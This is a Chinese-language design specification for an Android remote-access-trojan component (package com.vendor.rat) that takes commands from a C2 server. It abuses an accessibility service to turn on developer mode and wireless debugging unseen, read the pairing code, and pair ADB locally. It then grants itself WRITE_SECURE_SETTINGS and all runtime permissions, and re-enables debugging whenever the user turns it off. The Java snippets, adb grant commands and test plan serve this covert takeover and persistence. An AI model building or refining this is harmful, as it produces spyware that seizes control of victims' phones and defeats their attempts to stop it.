# WirelessPairEngine 无线调试自配对引擎设计规格

## 概述

**目标：** 实现完全零 USB 依赖的无线 ADB 自配对引擎。通过无障碍服务自动导航 Android 设置界面，开启开发者模式和无线调试，读取配对码完成配对，最终获得 `WRITE_SECURE_SETTINGS` 实现永久自治。

**目标设备：** OPPO PGFM10 (Android 16, API 36, ColorOS V816)

**核心创新：** Vendor APK 需要 C2 服务端中转配对码（截屏 → 人工读取 → POST /adbPair），我们直接从无障碍节点树读取配对码，完全本地化。

## 系统架构

```
触发入口
    │
    ├─ KeepHeartThread.heartbeat()  → paired=false + wifi 可用 + 无障碍已启动
    ├─ C2 指令 /requestLocalAdbPair → WebSocket 路由
    └─ 手动调用 WirelessPairEngine.startPairing()
    │
    ▼
防重入检查: mPairingInProgress.compareAndSet(false, true)
    │ (如果已有引擎在运行 → 跳过)
    ▼
WirelessPairEngine extends AutoEngine
    监听: com.android.settings + com.android.systemui
           (TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOW_CONTENT_CHANGED)
    │
    ├─ Phase 0: 开启开发者模式 (如果未开启)
    │   委托 OpenDevelopmentDelegate (已有实现，支持多厂商)
    │   检测方式: 尝试导航到开发者选项，如果菜单不存在则触发 Phase 0
    │   完成回调 → 进入 Phase 1
    │
    ├─ Phase 1: 导航到开发者选项
    │   ├─ 1a: Intent 打开设置首页
    │   ├─ 1b: 点击"系统与更新" (或 "系统管理")
    │   └─ 1c: 点击"开发者选项"
    │
    ├─ Phase 2: 开启无线调试
    │   ├─ 2a: 下滑找到"无线调试" (getScrollableNode().scrollForward(), 最多 10 次)
    │   ├─ 2b: 找到切换控件 (Switch 或 RadioButton，OPPO ColorOS 16 可能用 RadioButton)
    │   │       GKD: "[clickable=true] >n TextView[text*=\"无线调试\"]"
    │   ├─ 2c: 检查切换状态 (checked)
    │   └─ 2d: 未开启 → 点击开启 → 处理确认对话框
    │          确认按钮 GKD: "[id$=\"button1\"]" 或 "Button[text*=\"确认\"]" 或 "Button[text*=\"允许\"]"
    │
    ├─ Phase 3: 点击"使用配对码配对"
    │   进入无线调试子页面 → 找到并点击按钮
    │   转换条件: 检测到配对码对话框出现 (含 6 位纯数字 TextView)
    │
    ├─ Phase 4: 读取配对码 + 端口号 → 本地配对 (在 scheduler 线程异步执行)
    │   ├─ 4a: 从对话框节点树读取 6 位配对码 (Java 正则 Pattern.matches("\\d{6}", text))
    │   ├─ 4b: 从对话框节点树解析端口号 (从 "IP:端口" 格式提取, 验证 port >= 30000 && port <= 49999)
    │   └─ 4c: scheduler.execute(() -> AdbConnectionManager.doPair("127.0.0.1", port, code))
    │
    ├─ Phase 5: 自动连接 (在 scheduler 线程异步执行)
    │   scheduler.execute(() -> {
    │       doAutoConnect() → 失败则等 3s 重试 → 最多 3 次
    │   })
    │
    └─ Phase 6: Bootstrap 权限自举 (在 scheduler 线程异步执行)
        ├─ AdbShellExecutor.grantWriteSecureSettings("com.vendor.rat")
        │   如果失败 (Android 16 限制) → 记录日志，跳过后续，标记 DONE_PARTIAL
        ├─ SecureSettingsWriter.enableWifiDebug(ctx)
        ├─ SecureSettingsWriter.enableDeveloperOptions(ctx)
        └─ AdbShellExecutor.grantAllPermissions("com.vendor.rat")
```

### 关于 Phase 6 的 Android 16 限制

已知 Android 16 无线 ADB shell (UID 2000) 不具备 `GRANT_RUNTIME_PERMISSIONS` 权限，
`pm grant` 危险权限会抛 `SecurityException`。但 `WRITE_SECURE_SETTINGS` 不属于危险权限分类，
属于 signature|privileged 级别，需要在阶段 1 dump 时通过 `adb shell pm grant` 实际验证。

**降级方案：**
- 如果 `WRITE_SECURE_SETTINGS` 也被限制 → Phase 6 标记为 `DONE_PARTIAL`（配对成功但无自举）
- 后续恢复只能通过重新走 Phase 0-5 全流程
- 本引擎的核心价值（自动配对 + 自动连接）不受影响，仅自举闭环受影响

## 组件设计

### 1. WirelessPairEngine

**包路径：** `com.vendor.rat.auto.engine.adb`

**继承：** `AutoEngine`

**职责：** 无线调试配对全流程自动化的主引擎

#### 状态枚举

```java
enum PairState {
    IDLE,                      // 初始/空闲
    ENABLE_DEV_MODE,           // Phase 0: 开启开发者模式
    NAVIGATE_DEV_OPTIONS,      // Phase 1: 导航到开发者选项
    ENABLE_WIRELESS_DEBUG,     // Phase 2: 开启无线调试
    CLICK_PAIR_CODE,           // Phase 3: 点击"使用配对码配对"
    READ_AND_PAIR,             // Phase 4: 读取配对码 + 配对
    AUTO_CONNECT,              // Phase 5: 自动连接
    BOOTSTRAP_PERMISSIONS,     // Phase 6: 权限自举
    DONE,                      // 完成
    FAILED                     // 失败
}
```

#### 窗口监听

```java
// 监听 com.android.settings (开发者选项、无线调试页面)
WindowMatcher("com.android.settings")
    .addEventType(TYPE_WINDOW_STATE_CHANGED)     // 32
    .addEventType(TYPE_WINDOW_CONTENT_CHANGED)   // 2048

// 监听 com.android.systemui (配对码对话框可能由 systemui 承载)
WindowMatcher("com.android.systemui")
    .addEventType(TYPE_WINDOW_STATE_CHANGED)     // 32
    .addEventType(TYPE_WINDOW_CONTENT_CHANGED)   // 2048

// 注意: 配对码对话框的包名归属需要在阶段 1 dump 时确认
// 可能是 com.android.settings 的 Dialog，也可能是 com.android.systemui
// dump 后校准 WindowMatcher 列表
```

#### 并发保护

```java
// 外部防重入锁 (在 AdbConnectionManager 或 heartbeat 侧)
private static final AtomicBoolean mPairingInProgress = new AtomicBoolean(false);

// startPairing() 入口检查
public static boolean startPairing() {
    if (!mPairingInProgress.compareAndSet(false, true)) {
        Log.d(TAG, "配对引擎已在运行，跳过");
        return false;
    }
    // ... 启动引擎
}

// finish() 时释放
@Override protected void finish() {
    mPairingInProgress.set(false);
    super.finish();
}
```

#### 超时机制

- 每个 Phase 超时：15 秒
- 整体超时：120 秒
- 失败重试：同一 Phase 最多重试 3 次

#### 核心方法

| 方法 | 职责 |
|------|------|
| `execute()` | 入口：检查前置条件 → 尝试导航到开发者选项 → 找不到则委托 OpenDevelopmentDelegate |
| `onEventSafe()` | 事件驱动：根据当前 Phase 分发到对应 handler |
| `handleEnableDevMode()` | Phase 0: 委托 OpenDevelopmentDelegate.start() 并注册完成回调 |
| `handleNavigateDevOptions()` | Phase 1: 导航到开发者选项 |
| `handleEnableWirelessDebug()` | Phase 2: 找到无线调试 Switch 并开启 |
| `handleClickPairCode()` | Phase 3: 点击"使用配对码配对" |
| `handleReadAndPair()` | Phase 4: 读取配对码 + 调用 doPair() |
| `handleAutoConnect()` | Phase 5: doAutoConnect() |
| `handleBootstrap()` | Phase 6: 权限自举 |
| `transitionTo(PairState)` | 状态转换 + 日志 + 超时重置 |

### 2. WirelessPairConstants

**包路径：** `com.vendor.rat.auto.engine.adb`

**职责：** 所有 GKD Selector 表达式和文本常量

```java
// --- OPPO ColorOS 文本常量 ---
// Phase 0: 开启开发者模式
TEXT_ABOUT_PHONE = "关于本机"
TEXT_VERSION_INFO = "版本信息"
TEXT_BUILD_NUMBER = "版本号"

// Phase 1: 导航到开发者选项
TEXT_SYSTEM_UPDATE = "系统与更新"       // OPPO ColorOS
TEXT_SYSTEM_MANAGEMENT = "系统管理"     // 备选
TEXT_DEVELOPER_OPTIONS = "开发者选项"

// Phase 2: 无线调试
TEXT_WIRELESS_DEBUG = "无线调试"
TEXT_WIRELESS_DEBUG_EN = "Wireless debugging"

// Phase 3: 使用配对码
TEXT_PAIR_WITH_CODE = "使用配对码配对"
TEXT_PAIR_WITH_CODE_EN = "Pair device with pairing code"

// Phase 4: 配对码对话框
REGEX_PAIR_CODE = "\\d{6}"             // 6 位数字
REGEX_PAIR_PORT = "\\d{5}"            // 5 位端口号 (30000-49999)

// Phase 2: 无线调试确认对话框 (多种按钮布局)
TEXT_CONFIRM = "确认"
TEXT_ALLOW = "允许"
TEXT_OK = "确定"

// --- GKD Selector 表达式 ---
// ⚠️ 这些 selector 需要根据真机 XML dump 精确定义
// ⚠️ 初始值为预估，阶段 1 dump 后必须校准
// ⚠️ 注意: GKD 的 [text~=""] 是空白分隔 word match，不是正则
//         正则需要在 Java 层用 Pattern.matches() 处理

// Phase 0: 由 OpenDevelopmentDelegate 处理，此处无需 selector

// Phase 1: 导航
SEL_SYSTEM_UPDATE = "[clickable=true] >n TextView[text*=\"系统与更新\"]"
SEL_DEV_OPTIONS = "[clickable=true] >n TextView[text*=\"开发者选项\"]"

// Phase 2: 无线调试 (点击可点击父容器，不直接点文字)
SEL_WIRELESS_DEBUG_ROW = "[clickable=true] >n TextView[text*=\"无线调试\"]"
// Switch/RadioButton 状态检查 (OPPO ColorOS 16 可能用 RadioButton)
SEL_WIRELESS_DEBUG_TOGGLE = "Switch" // 或 "RadioButton"，dump 后确认
// 确认对话框按钮 (3 种变体)
SEL_CONFIRM_BUTTON = "[id$=\"button1\"]"
SEL_CONFIRM_TEXT_BUTTON = "Button[text*=\"确认\"]"
SEL_ALLOW_TEXT_BUTTON = "Button[text*=\"允许\"]"

// Phase 3: 配对码按钮
SEL_PAIR_WITH_CODE = "[clickable=true] >n TextView[text*=\"使用配对码\"]"

// Phase 4: 配对码对话框 — 不用 GKD 正则
// 配对码和端口号通过 Java 层 findAll(root, "TextView") 遍历
// 然后用 Pattern.matches("\\d{6}", text) 匹配配对码
// 端口号从 "IP:端口" 格式解析: text.contains(":") → split → parseInt → 验证范围
```

### 3. UI XML Dump 脚本

**路径：** `android/scripts/dump_wireless_pair_ui.sh`

**职责：** 在真机上 dump 5 个关键页面的 AccessibilityNodeInfo XML

```bash
# dump 的 5 个页面：
# 1. 设置首页 → fixtures/oppo/settings_home.xml
# 2. 关于本机 → fixtures/oppo/about_phone.xml
# 3. 版本信息 → fixtures/oppo/version_info.xml
# 4. 开发者选项 → fixtures/oppo/dev_options.xml
# 5. 无线调试页面 + 配对码对话框 → fixtures/oppo/wireless_debug.xml + pair_code_dialog.xml
```

每个 dump 使用 `adb shell uiautomator dump /sdcard/window_dump.xml && adb pull /sdcard/window_dump.xml`

### 4. GKD Selector Fixture 测试

**路径：** `android/app/src/test/java/com/vendor/rat/auto/engine/adb/WirelessPairSelectorTest.java`

**框架：** JUnit 4 + Robolectric + GKD Selector

每个测试加载对应的 XML fixture，验证 GKD Selector 能正确找到目标节点：

- `testFindAboutPhoneInSettingsHome()` — 设置首页找"关于本机"
- `testFindVersionInfoInAboutPhone()` — 关于本机找"版本信息"
- `testFindBuildNumberInVersionInfo()` — 版本信息找"版本号"
- `testFindSystemUpdateInSettingsHome()` — 设置首页找"系统与更新"
- `testFindDevOptionsInSystemUpdate()` — 系统与更新找"开发者选项"
- `testFindWirelessDebugInDevOptions()` — 开发者选项找"无线调试"
- `testFindPairCodeButtonInWirelessDebug()` — 无线调试找"使用配对码配对"
- `testReadPairCodeFromDialog()` — 配对码对话框提取 6 位数字
- `testReadPairPortFromDialog()` — 配对码对话框提取端口号

### 5. E2E 真机测试

**路径：** `android/app/src/androidTest/java/com/vendor/rat/auto/engine/adb/WirelessPairE2ETest.java`

**框架：** AndroidJUnit4 + InstrumentationRegistry

分步验证：
- `testNavigateToAboutPhone()` — 导航到关于本机
- `testNavigateToVersionInfo()` — 导航到版本信息
- `testEnableDevMode()` — 连续点击版本号
- `testNavigateToDevOptions()` — 导航到开发者选项
- `testEnableWirelessDebug()` — 开启无线调试
- `testReadPairCode()` — 读取配对码
- `testFullPairFlow()` — 完整配对流程 (Phase 0-6)

### 6. 引擎启动机制

**WirelessPairEngine 不注册到 EngineManager。** 它是按需单次运行的任务引擎，
与 keepalive 引擎（OPPO/华为等常驻事件驱动）不同。

启动方式：由 `heartbeat()` 或 C2 指令直接实例化并调用 `startPairing()`。

```java
// 在 AdbConnectionManager.heartbeat() 中：
if (!isPaired() && wifiConnected && accessibilityReady) {
    WirelessPairEngine.startPairing(context);  // 内部防重入
}

// 在 AdbOperationHandler.requestLocalAdbPair() 中：
WirelessPairEngine.startPairing(context);
```

引擎自行注册到 `MyAccessibilityService` 的事件流中（通过 `service.addEngine(this)`），
完成后通过 `finish()` 自行注销。

## 恢复机制

```
用户关闭无线调试
    │
    ▼
heartbeat() 检测 connected=false
    │
    ├─ 有 WRITE_SECURE_SETTINGS?
    │   └─ 是 → Settings.Global.putInt("adb_wifi_enabled", 1)
    │         → doAutoConnect() (RSA key 已被信任，无需重新配对)
    │         → 恢复完成 ✅
    │
    └─ 无 WRITE_SECURE_SETTINGS?
        └─ → 重新启动 WirelessPairEngine (全流程)
```

**关键洞察：** 首次配对成功并获得 `WRITE_SECURE_SETTINGS` 后，后续恢复只需直写 Settings + mDNS 重连，不再需要 UI 自动化。UI 自动化只在**首次配对**时需要。

## 开发计划（5 阶段）

| 阶段 | 内容 | 依赖 |
|------|------|------|
| 阶段 1 | ADB dump 5+ 页面 XML (包括确认对话框) | OPPO 真机 |
| 阶段 1.5 | 验证 `pm grant WRITE_SECURE_SETTINGS` 在无线 ADB 下是否可行 | OPPO 真机 |
| 阶段 2 | 基于 XML 写 GKD Selector + fixture 测试 | 阶段 1 XML |
| 阶段 3 | 实现 WirelessPairEngine (7 Phase) | 阶段 2 selector |
| 阶段 4 | 真机 E2E 测试 | 阶段 3 + 真机 |

### 阶段 1.5 验证项

在 OPPO 真机上通过已建立的无线 ADB 连接执行：
```bash
adb shell pm grant com.vendor.rat android.permission.WRITE_SECURE_SETTINGS
```
- 成功 → Phase 6 完整实现
- 失败 (`SecurityException`) → Phase 6 标记为 `DONE_PARTIAL`，文档记录降级方案

## 文件清单

| 文件 | 类型 | 职责 |
|------|------|------|
| `auto/engine/adb/WirelessPairEngine.java` | 新建 | 主引擎 (7 Phase 状态机) |
| `auto/engine/adb/WirelessPairConstants.java` | 新建 | 文本常量 + GKD Selector |
| `scripts/dump_wireless_pair_ui.sh` | 新建 | UI dump 脚本 |
| `fixtures/oppo/settings_home.xml` | 新建 | 设置首页 XML |
| `fixtures/oppo/about_phone.xml` | 新建 | 关于本机 XML |
| `fixtures/oppo/version_info.xml` | 新建 | 版本信息 XML |
| `fixtures/oppo/dev_options.xml` | 新建 | 开发者选项 XML |
| `fixtures/oppo/wireless_debug.xml` | 新建 | 无线调试页 XML |
| `fixtures/oppo/pair_code_dialog.xml` | 新建 | 配对码对话框 XML |
| `fixtures/oppo/wireless_debug_confirm.xml` | 新建 | 无线调试确认对话框 XML |
| `test/.../WirelessPairSelectorTest.java` | 新建 | Selector fixture 测试 |
| `androidTest/.../WirelessPairE2ETest.java` | 新建 | 真机 E2E 测试 |
| `adb/AdbConnectionManager.java` | 修改 | heartbeat() 触发配对引擎 |
| `control/server/AdbOperationHandler.java` | 修改 | requestLocalAdbPair() 触发配对引擎 |

## 约束与风险

1. **Android 16 配对码有效期短** — 配对码对话框打开后约 60s 过期，读取 + 配对需要在此窗口内完成
2. **首次需要用户开启无障碍服务** — 这是唯一的手动步骤（与 Vendor 一致）
3. **OPPO ColorOS UI 可能随版本变化** — selector 表达式需要基于真实 XML dump 校准，失败时记录详细日志（包含当前节点树概况），便于后续校准
4. **`pm grant` 在 Android 16 无线 ADB 不可用** — 阶段 1.5 验证 `WRITE_SECURE_SETTINGS` 是否也被限制。如果被限制，Phase 6 降级为 `DONE_PARTIAL`
5. **连续点击版本号的速度要求** — Phase 0 委托给已有的 `OpenDevelopmentDelegate`（已解决此问题，使用无延迟连续点击 + Handler.postDelayed 控制在 600ms 内完成）
6. **配对码对话框包名归属不确定** — 可能在 `com.android.settings` 或 `com.android.systemui`，需要阶段 1 dump 确认。WindowMatcher 预注册两个包名
7. **Phase 4 doPair() 是阻塞网络操作** — 必须在 `scheduler.execute()` 内异步调用，不能在无障碍事件回调线程执行

## 与 Vendor 的差异

| 方面 | Vendor (o/a0.java) | 我们 (WirelessPairEngine) |
|------|---------------------|--------------------------|
| 配对码来源 | C2 中转（截屏→人工→API） | 本地无障碍节点直读 |
| 厂商覆盖 | 6 厂商 (2003 行) | 仅 OPPO (目标 300-400 行) |
| UI 查找方式 | CombineFilter 链式过滤 | GKD Selector (CSS-like) |
| 开发者模式 | 未包含（假设已开启） | 委托 OpenDevelopmentDelegate 开启 |
| 测试方式 | 无 | fixture 测试 + E2E |

---

> **分析日期**: 2026-03-27
> **目标设备**: OPPO PGFM10, Android 16, API 36, ColorOS V816
> **前置依赖**: libadb-android 3.1.1 已集成, AdbConnectionManager 已实现
